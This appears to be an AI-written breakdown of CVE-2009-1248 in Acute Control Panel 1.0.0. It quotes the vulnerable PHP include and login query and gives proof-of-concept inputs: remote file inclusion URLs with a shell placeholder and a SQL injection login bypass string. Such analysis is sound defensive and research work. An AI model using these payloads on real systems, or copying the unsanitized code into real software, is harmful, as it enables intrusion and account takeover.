Based on the provided content, here's the breakdown of CVE-2009-1248:

**Vulnerability Details:**

*   **Root Cause:** The vulnerability arises from two distinct weaknesses:
    *   **Remote File Inclusion (RFI):** The application uses user-supplied data to construct file paths for inclusion. Specifically, the `theme_directory` parameter is used in `container.php` and `header.php` to include files, without proper sanitization.
    *   **SQL Injection:**  The login functionality in `login.php` is vulnerable to SQL injection due to unsanitized user input in the username and password fields.
*   **Weaknesses/Vulnerabilities:**
    *   **RFI:** Unvalidated user input passed to `include_once` allows an attacker to include arbitrary remote files.
    *   **SQL Injection:** Improper sanitization of user-provided username and password allows an attacker to manipulate the SQL query.
*   **Impact of Exploitation:**
    *   **RFI:** Successful exploitation allows an attacker to execute arbitrary code on the server by including a malicious remote file.
    *   **SQL Injection:** Successful exploitation allows an attacker to bypass authentication by injecting SQL statements that always evaluate to true. This can grant the attacker administrative access to the application.
*   **Attack Vectors:**
    *   **RFI:** HTTP GET requests to `container.php` and `header.php` with a crafted `theme_directory` parameter that includes a URL to a malicious file.
    *  **SQL Injection:** HTTP POST request to login.php with specially crafted username and password values to bypass authentication
*   **Required Attacker Capabilities/Position:**
    *   The attacker needs to be able to send HTTP requests to the vulnerable web application.

**Technical Details:**

*   **Vulnerable code (RFI):**
    *   `container.php`:  `<?php include_once($theme_directory."/sidebar.php"); ?>`
    *   `header.php`:  `<?php include_once($theme_directory."/navigation.php"); ?>`
*   **Vulnerable code (SQL Injection):**
    *   `login.php`:
        ```php
        $query = mysql_query("SELECT
        id,username,password,email,fullname,permissions FROM `users` WHERE
        username='$username' AND password='$password'", $conn) or
        die(mysql_error());
        ```
*   **Exploit PoC (RFI):**
    *   `http://127.0.0.1/themes/container.php?theme_directory=[Shell]%00`
    *  `http://127.0.0.1/themes/header.php?theme_directory=[Shell]%00`
*  **Exploit PoC (SQL Injection):**
    * Username: `admin ' or ' 1=1`
    * Password: anything or nothing

**Additional Notes:**

*   The exploit-db content provides more technical details regarding the vulnerable code and proof of concept than the typical CVE description.
*   The vulnerability affects "Acute Control Panel 1.0.0".
*   The Exploit-DB entry lists CVE-2009-1247 as also related, which is likely a related vulnerability in the same software.
